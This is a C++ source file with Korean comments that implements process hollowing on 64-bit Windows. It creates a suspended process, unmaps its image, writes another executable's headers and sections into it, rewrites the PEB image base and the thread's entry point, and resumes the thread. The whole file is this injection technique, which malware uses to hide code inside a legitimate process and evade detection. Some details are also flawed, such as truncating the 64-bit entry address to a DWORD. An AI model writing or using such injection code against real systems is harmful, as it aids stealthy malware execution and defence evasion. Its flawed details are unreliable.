#define _CRT_SECURE_NO_WARNINGS
#include "Hollow.h"
#pragma comment(lib, "ntdll.lib")

Hollow::Hollow() {
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	si.cb = sizeof(si);
}
Hollow::~Hollow() {
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);
}

bool Hollow::CreateDummyProcess(const wchar_t* pCommandLine) {
	wchar_t szCommandLine[MAX_PATH] = { 0, };

	wcscpy(szCommandLine, pCommandLine);
	if (!CreateProcessW(NULL, szCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &this->si, &this->pi)) {
		return false;
	}

	return true;
}

bool Hollow::ProcessHollowing(const wchar_t* pProgramPath) {
	HANDLE hFile, hFileMapping;

	PIMAGE_DOS_HEADER pDos;
	PIMAGE_NT_HEADERS pNt;
	PIMAGE_SECTION_HEADER pSec;

	CONTEXT ctx = { 0,};
	LPVOID lpTargetBase, lpAllocMem;

	ctx.ContextFlags = CONTEXT_FULL;

	if (this->pi.dwProcessId == 0 || this->pi.dwThreadId == 0) {
		return false;
	}

	hFile = CreateFileW(pProgramPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return false;
	}

	hFileMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
	if (hFileMapping == INVALID_HANDLE_VALUE) {
		return false;
	}

	pDos = (PIMAGE_DOS_HEADER)MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
		return false;
	}

	pNt = (PIMAGE_NT_HEADERS)((PBYTE)pDos + pDos->e_lfanew);
	// Dummy 프로세스 메인 스레드 컨텍스트 가져오기
	if (!GetThreadContext(this->pi.hThread, &ctx)) {
		return false;
	}

	// PEB에서 ImageBase 읽기
	if (!ReadProcessMemory(this->pi.hProcess, (LPVOID)(ctx.Rbx + 8), &lpTargetBase, sizeof(LPVOID), NULL)) {
		return false;
	}

	// Dummy 프로세스의 베이스 주소와 스위칭할 프로그램의 베이스 주소가 같을 시에 언매핑
	if (lpTargetBase == (LPVOID)pNt->OptionalHeader.ImageBase) {
		NtUnmapViewOfSection(this->pi.hProcess, lpTargetBase);
	}

	// Dummy 프로세스에 ImageBase 주소 메모리 할당
	lpAllocMem = VirtualAllocEx(this->pi.hProcess, (LPVOID)pNt->OptionalHeader.ImageBase, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocMem == NULL) {
		return false;
	}

	// PE 헤더 쓰기
	if (!WriteProcessMemory(this->pi.hProcess, lpAllocMem, pDos, pNt->OptionalHeader.SizeOfHeaders, NULL)) {
		return false;
	}

	// 섹션 쓰기
	for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
		pSec = (PIMAGE_SECTION_HEADER)((PBYTE)pDos + pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		WriteProcessMemory(this->pi.hProcess, (LPVOID)((PBYTE)lpAllocMem + pSec->VirtualAddress), (LPVOID)((PBYTE)pDos + pSec->PointerToRawData), pSec->SizeOfRawData, NULL);
	}

	// EntryPoint 설정
	ctx.Rax = (DWORD)((PBYTE)lpAllocMem + pNt->OptionalHeader.AddressOfEntryPoint);
	// PEB ImageBase 재설정
	if (!WriteProcessMemory(this->pi.hProcess, (PVOID)(ctx.Rbx + 8), &pNt->OptionalHeader.ImageBase, sizeof(PVOID), NULL)) {
		return false;
	}

	// 스레드 컨텍스트 적용
	if (!SetThreadContext(this->pi.hThread, &ctx)) {
		return false;
	}
	// Dummy 프로세스의 메인 스레드 재계
	NtResumeThread(this->pi.hThread, NULL);

	UnmapViewOfFile(pDos);
	CloseHandle(hFile);
	CloseHandle(hFileMapping);
	return true;
}
